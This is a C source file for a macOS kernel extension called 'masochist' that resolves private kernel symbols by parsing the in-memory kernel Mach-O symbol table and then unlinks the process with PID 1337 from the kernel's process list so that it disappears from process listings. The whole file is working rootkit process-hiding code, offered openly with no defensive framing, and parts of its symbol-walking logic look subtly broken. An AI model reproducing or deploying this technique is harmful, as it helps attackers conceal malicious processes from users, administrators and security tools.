//
//  masochist.c
//  masochist
//
//  Created by Squiffy on 11/6/14.
//  Copyright (c) 2014 squiffypwn. All rights reserved.
//

#include <mach/mach_types.h>
#include <mach-o/loader.h>
#include <mach-o/nlist.h>
#include <mach/mach_types.h>
#include <sys/systm.h>
#include <stdbool.h>
#include "masochist.h"

kern_return_t masochist_start(kmod_info_t * ki, void *d);
kern_return_t masochist_stop(kmod_info_t *ki, void *d);

#define KERNEL_BASE (0xffffff8000200000 + 0x8000000) // use kas_info

kern_return_t masochist_start(kmod_info_t * ki, void *d)
{
    /* XXX: Replace printf's with a debug logger. This way, we can turn off
     *      these printf's by utilizing #define DEBUG
     */
    
    struct mach_header_64 *kernel_header = (struct mach_header_64 *)KERNEL_BASE;
    
    printf("INCOMING KERNEL MACH-O HEADER.\n");
    printf("Magic: 0x%x\n", kernel_header->magic);
    printf("CPU type: 0x%x\n", kernel_header->cputype);
    printf("CPU subtype: 0x%x\n", kernel_header->cpusubtype);
    printf("Filetype: 0x%x\n", kernel_header->filetype);
    printf("ncmds: 0x%x\n", kernel_header->ncmds);
    printf("sizeofcmds: 0x%x\n", kernel_header->sizeofcmds);
    printf("flags: 0x%x\n", kernel_header->flags);
    printf("reserved: 0x%x\n", kernel_header->reserved);
    printf("=========================== PARSING LOAD COMMANDS ===========================\n");
    
    struct load_command *lc = NULL;
    struct segment_command_64 *seg = NULL;
    struct segment_command_64 *linkedit = NULL;
    
    /* First load command starts right after the header */
    
    lc = (struct load_command *)(sizeof(struct mach_header_64) + KERNEL_BASE);
    
    int i;
    for(i = 0; i < kernel_header->ncmds; i++) {
        if(lc->cmd == LC_SEGMENT_64) {
            seg = (struct segment_command_64 *)lc;
            if(strcmp(seg->segname, "__LINKEDIT") == 0) {
                linkedit = (struct segment_command_64 *)lc;
                printf("Found __LINKEDIT!\n");
                break;
            }
        }
        lc = (struct load_command *)((uint64_t)lc + (uint64_t)lc->cmdsize);
    }
    
    if(linkedit == NULL) {
        printf("__LINKEDIT doesn't exit.\n");
        return KERN_FAILURE;
    }
    
    printf("=========================== LOCATING SYMBOL TABLES ===========================\n");
    
    struct symtab_command *lc_symtab;
    for(i = 0; i < kernel_header->ncmds; i++) {
        if(lc->cmd == LC_SYMTAB) {
            lc_symtab = (struct symtab_command *)lc;
            lc = (struct load_command *)(sizeof(struct mach_header_64) + KERNEL_BASE);
            printf("Found LC_SYMTAB!\n");
            break;
        }
        lc = (struct load_command *)((uint64_t)lc + (uint64_t)lc->cmdsize);
    }
    
    uint64_t symbolTable = (linkedit->vmaddr + (lc_symtab->symoff) - linkedit->fileoff);
    uint64_t stringTable = (linkedit->vmaddr + (lc_symtab->stroff - linkedit->fileoff));
    
    printf("Symbol table @ 0x%llx\n", symbolTable);
    printf("String table @ 0x%llx\n", stringTable);
    
    printf("=========================== SEARCHING FOR SYMBOLS ===========================\n");
    
    struct proclist *procList = NULL;
    struct proc *process = NULL;
    
    struct nlist_64 *nlist = (struct nlist_64 *)symbolTable;
    void (*proc_list_lock)() = NULL;
    void (*proc_list_unlock)() = NULL;
    
    /* XXX: Put symbol finding in its own function*/
    
    for(i = 0; i < lc_symtab->nsyms; i++) {
        if(!strcmp("_allproc", (char *)(nlist->n_un.n_strx + stringTable))) {
            printf("Found `_allproc'.\n");
            procList = (struct proclist *)(nlist->n_value);
        } else if(!strcmp("_proc_list_lock", (char *)(nlist->n_un.n_strx + stringTable))) {
            printf("Found `_proc_list_lock'.\n");
            proc_list_lock = (void *)(nlist->n_value);
        } else if(!strcmp("_proc_list_unlock", (char *)(nlist->n_un.n_strx + stringTable))) {
            printf("Found `_proc_list_unlock'.\n");
            proc_list_unlock = (void *)(nlist->n_value);
        }
        
        nlist = (struct nlist_64 *)(symbolTable + (i * sizeof(struct nlist_64)));
    }
    
    printf("=========================== HIDING PROCESS ===========================\n");
    for (process = procList->lh_first; process != 0; process = process->p_list.le_next) {
        
        if(process->p_pid == 1337) {
            proc_list_lock();
            LIST_REMOVE(process, p_list);
            proc_list_unlock();
        }
        
    }
    
    printf("Done.\n");
    
    return KERN_SUCCESS;
}

kern_return_t masochist_stop(kmod_info_t *ki, void *d)
{
    return KERN_SUCCESS;
}
